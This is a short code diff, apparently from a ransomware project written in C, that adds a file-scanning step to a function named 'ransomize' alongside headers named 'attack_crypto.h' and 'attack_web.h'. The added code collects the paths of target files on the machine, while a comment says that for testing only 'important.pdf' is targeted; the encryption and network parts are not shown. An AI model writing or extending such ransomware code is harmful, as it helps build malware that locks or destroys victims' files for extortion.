@@ -2,11 +2,32 @@
 #include "attack_crypto.h"
 #include "get_relative_path.h"
 #include "attack_web.h"
+#include "read_files.h"
 #include <stdio.h>
 
 int ransomize(void)
 {
-    /* Target files */
+    /* Target files, save paths in an array */
+    size_t count = 0;
+    char **paths = find_paths(&count);
+
+    if (!paths) {
+        printf("Failed to scan files.\n");
+        return 1;
+    }
+    
+    // printf("Found %zu files:\n\n", count);
+    // for (size_t i = 0; i < count; i++) {
+    //     printf("%s\n", paths[i]);
+    // }
+
+    /* Cleanup */
+    for (size_t i = 0; i < count; i++) {
+        free(paths[i]);
+    }
+    free(paths);
+
+    /*For testing purposes, only get important.pdf*/
     char important[MAX_PATH];
     if (get_relative_path(important, sizeof(important), "important.pdf") != 0) {
         return 1;
